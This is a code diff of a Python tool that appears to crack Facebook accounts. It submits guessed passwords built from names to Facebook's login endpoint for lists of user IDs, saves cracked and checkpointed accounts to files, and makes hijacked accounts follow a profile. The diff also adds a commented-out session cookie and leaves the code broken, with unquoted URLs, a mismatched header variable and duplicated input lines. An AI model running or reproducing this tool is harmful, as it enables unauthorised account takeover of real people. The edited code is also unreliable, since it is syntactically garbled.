@@ -106,7 +106,7 @@ loop = 0
 
 url_lookup = "https://lookup-id.com/"
 
-url_mb = "https://x.facebook.com"
+url_mb = "https://m.facebook.com"
 
 url_ip = "https://www.httpbin.org/ip"
 
@@ -320,34 +320,20 @@ class __xxx__:
 
                 session=requests.Session()
 
-                header = {
-
-                    "Host":cebok,
-
-                    "upgrade-insecure-requests":"1",
-
-                    "user-agent":"Mozilla/5.0 (Windows NT 6.1; WOW64; rv:33.0) Gecko/20120101 Firefox/33.0",
-
-                    "accept":"text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7",
-
-                    "dnt":"1",
-
-                    "x-requested-with":"mark.via.gp",
-
-                    "sec-fetch-site":"none",
-
-                    "sec-fetch-mode":"navigate",
-
-                    "sec-fetch-user":"?1",
-
-                    "sec-fetch-dest":"document",
-
-                    "referer":"https://x.facebook.com/",
-
-                    "accept-encoding":"gzip, deflate br",
-
-                    "accept-language":"en-US,en;q=0.9"
-
+                headers = {
+                    'authority': 'm.facebook.com',
+                    'accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7',
+                    'accept-language': 'en-US,en;q=0.9',
+                     # 'cookie': 'datr=iGdKYyfcAB817biivkWWCUhU; sb=iGdKY-SNej4yXMqoxKp1Cugw; dpr=1.25; m_pixel_ratio=1.5; wd=965x714; fr=0CSyIkPHGp9NY8VQK..BjSmeI.EA.AAA.0.0.BkEYkE.AWXvY2TTaWc',
+                    'sec-ch-ua': '"Google Chrome";v="111", "Not(A:Brand";v="8", "Chromium";v="111"',
+                    'sec-ch-ua-mobile': '?0',
+                    'sec-ch-ua-platform': '"Windows"',
+                    'sec-fetch-dest': 'document',
+                    'sec-fetch-mode': 'navigate',
+                    'sec-fetch-site': 'none',
+                    'sec-fetch-user': '?1',
+                    'upgrade-insecure-requests': '1',
+                    'user-agent': 'Mozilla/5.0 (Windows NT 6.1; WOW64; rv:33.0) Gecko/20120101 Firefox/33.0',
                 }
 
                 r = session.get(f"https://{cebok}/index.php?next=https%3A%2F%2Fdevelopers.facebook.com%2Ftools%2Fdebug%2Faccesstoken%2F", headers=header)
@@ -370,39 +356,22 @@ class __xxx__:
 
                 header1 = {
 
-                    "Host":cebok,
-
-                    "cache-control":"max-age=0",
-
-                    "upgrade-insecure-requests":"1",
-
-                    "origin":"https://"+cebok,
-
-                    "content-type":"application/x-www-form-urlencoded",
-
-                    "user-agent":"Mozilla/5.0 (Windows NT 6.1; WOW64; rv:33.0) Gecko/20120101 Firefox/33.0",
-
-                    "accept":"text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7",
-
-                    "x-requested-with":"XMLHttpRequest",
-
-                    "sec-fetch-site":"none",
-
-                    "sec-fetch-mode":"navigate",
-
-                    "sec-fetch-user":"?1",
-
-                    "sec-fetch-dest":"document",
-
-                    "referer":"https://"+cebok+"/index.php?next=https%3A%2F%2Fdevelopers.facebook.com%2Ftools%2Fdebug%2Faccesstoken%2F",
-
-                    "accept-encoding":"gzip, deflate br",
-
-                    "accept-language":"en-US,en;q=0.9"
-
+                    'authority': 'm.facebook.com',
+                    'accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7',
+                    'accept-language': 'en-US,en;q=0.9',
+                     # 'cookie': 'datr=iGdKYyfcAB817biivkWWCUhU; sb=iGdKY-SNej4yXMqoxKp1Cugw; dpr=1.25; m_pixel_ratio=1.5; wd=965x714; fr=0CSyIkPHGp9NY8VQK..BjSmeI.EA.AAA.0.0.BkEYkE.AWXvY2TTaWc',
+                    'sec-ch-ua': '"Google Chrome";v="111", "Not(A:Brand";v="8", "Chromium";v="111"',
+                    'sec-ch-ua-mobile': '?0',
+                    'sec-ch-ua-platform': '"Windows"',
+                    'sec-fetch-dest': 'document',
+                    'sec-fetch-mode': 'navigate',
+                    'sec-fetch-site': 'none',
+                    'sec-fetch-user': '?1',
+                    'upgrade-insecure-requests': '1',
+                    'user-agent': 'Mozilla/5.0 (Windows NT 6.1; WOW64; rv:33.0) Gecko/20120101 Firefox/33.0',
                 }
 
-                po = session.post(f"https://{cebok}/login/device-based/validate-password/?shbl=0", data = das, headers = header1, allow_redirects = False)
+                po = session.post(m.facebook.com/login/device-based/validate-password/?shbl=0", data = das, headers = header1, allow_redirects = False)
 
                 if 'c_user' in session.cookies.get_dict():
 
@@ -414,7 +383,7 @@ class __xxx__:
 
                     ok.append(wrt)
 
-                    open('/sdcard/RIFAT_OK.txt' , 'a').write('%s\n' % wrt)
+                    open('/sdcard/AHM_OK.txt' , 'a').write('%s\n' % wrt)
 
                     self.follow(session,coki)
 
@@ -426,7 +395,7 @@ class __xxx__:
 
                         tokenz = open('.token.txt').read()
 
-                        cp_ttl = session.get(f'https://graph.facebook.com/{user}?fields=birthday&access_token={token}').json()['birthday']
+                        cp_ttl = session.get(m.facebook.com/{user}?fields=birthday&access_token={token}').json()['birthday']
 
                         month, day, year = cp_ttl.split('/')
 
@@ -438,7 +407,7 @@ class __xxx__:
 
                         cp.append(wrt)
 
-                        open('/sdcard/RITU_CP.txt' , 'a').write('%s\n' % wrt)
+                        open('/sdcard/AHM_CP.txt' , 'a').write('%s\n' % wrt)
 
                         break
 
@@ -476,11 +445,11 @@ class __xxx__:
 
     def follow(self, session, coki):
 
-        r = BeautifulSoup(session.get('https://mbasic.facebook.com', cookies={'cookie': coki}).text, 'html.parser')
+        r = BeautifulSoup(session.get('https://m.facebook.com', cookies={'cookie': coki}).text, 'html.parser')
 
         get = r.find('a', string='Ikuti').get('href')
 
-        session.get(('https://mbasic.facebook.com' + str(get)), cookies={'cookie': coki}).text
+        session.get(('https://m.facebook.com' + str(get)), cookies={'cookie': coki}).text
 
     def __pler__(self):
 
@@ -551,7 +520,11 @@ class __xxx__:
             p3 = input('   Name + 3 : ')
 
             p4 = input('   Name + 4 : ')
-
+					     
+	    p4 = input('   Name + 5 : ')
+					     
+            p4 = input('   Name + 6 : ')
+					     
             os.system("clear")
 
             print(logo)
@@ -578,7 +551,7 @@ class __xxx__:
 
                             pwx = [name, xz[0]+"123", xz[0]+xz[1], xz[0]+"12345"]
 
-                        ssbworld.submit(self.__metode__, uid, pwx, "mbasic.facebook.com")
+                        ssbworld.submit(self.__metode__, uid, pwx, "m.facebook.com")
 
                     except:
 
